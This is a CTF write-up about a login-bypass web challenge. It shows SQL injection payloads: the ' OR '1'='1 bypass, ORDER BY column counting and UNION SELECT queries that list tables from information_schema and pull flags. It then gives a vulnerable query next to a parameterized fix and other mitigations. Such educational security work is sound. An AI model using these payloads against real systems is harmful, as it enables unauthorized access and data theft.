---
title: "CTF Writeup: SQL Injection — Breaking the Login Wall"
date: 2026-02-20
category: ctf
tags:
  - web
  - sql-injection
  - ctf
  - owasp
author: Akshat
---

# CTF Writeup: SQL Injection — Breaking the Login Wall

**Challenge:** Login Bypass  
**Category:** Web  
**Difficulty:** Easy  
**Points:** 100  

---

## Challenge Description

> We built an incredibly secure login page. There's no way you're getting in without the right credentials.
> 
> **URL:** `http://challenge.ctf.example.com/login`

---

## Initial Recon

First stop: open the login page and look at what we're working with.

The page had a standard username/password form. Nothing fancy. We right-click → View Source to get some hints:

```html
<form action="/login" method="POST">
  <input type="text" name="username" placeholder="Username" />
  <input type="password" name="password" placeholder="Password" />
  <button type="submit">Login</button>
</form>
```

POST to `/login` with `username` and `password` fields. Classic.

---

## Testing for SQL Injection

The first thing to try is a basic SQL injection payload in the username field. If the backend does something like:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```

...without parameterized queries, we can break out of the string context.

**Payload: `' OR '1'='1`**

Username: `' OR '1'='1`  
Password: `anything`

This transforms the query to:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

Since `'1'='1'` is always true, the `OR` makes the whole WHERE clause true, and we get in as the first user in the database (usually admin).

---

## Bypassing Login

Submitting the payload... and we're in! The page redirects to `/dashboard` and shows:

```
Welcome back, admin!
Flag: CTF{sql_1nj3ct10n_byp4ss_4tw}
```

---

## Going Deeper — Blind SQLi

After grabbing the easy flag, I poked around more. The challenge had a search endpoint too:

```
GET /search?q=admin
```

Testing it: `GET /search?q=admin'`

The server returned a 500 error — SQL syntax error leaking! Let's try a `UNION` attack to extract database structure.

First, we need to know how many columns the original query returns. We try:

```
/search?q=admin' ORDER BY 1--
/search?q=admin' ORDER BY 2--
/search?q=admin' ORDER BY 3--   ← Error! So 2 columns.
```

Now a UNION SELECT to pull data:

```
/search?q=nope' UNION SELECT table_name, 2 FROM information_schema.tables--
```

This dumps all table names. We see `users`, `flags`. Let's pull from flags:

```
/search?q=nope' UNION SELECT flag, 2 FROM flags--
```

> `CTF{un10n_b4s3d_sql1_ftw}`

Second flag found!

---

## Mitigation

The fix for both of these vulnerabilities is trivial:

**1. Use Parameterized Queries / Prepared Statements**

```python
# Vulnerable ❌
query = f"SELECT * FROM users WHERE username = '{username}'"

# Secure ✅
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

**2. Use an ORM**

ORMs like SQLAlchemy, Django ORM, Hibernate handle parameterization automatically.

**3. Input Validation**

Validate and sanitize input. Username fields shouldn't accept single quotes, `--`, or `UNION`.

**4. Least Privilege**

The database user your app connects with should NOT have access to `information_schema` or other sensitive system tables.

---

## Summary

| Step | Technique | Result |
|------|-----------|--------|
| Login bypass | `' OR '1'='1` | Admin access |
| Column count | `ORDER BY n--` | 2 columns |
| Data extraction | `UNION SELECT` | Flag from flags table |

Classic SQL injection still alive and well in CTFs. This challenge is a great reminder of why parameterized queries are not optional — they're fundamental.

---

*Written by Akshat. Questions? Open an issue on [GitHub](https://github.com/).*
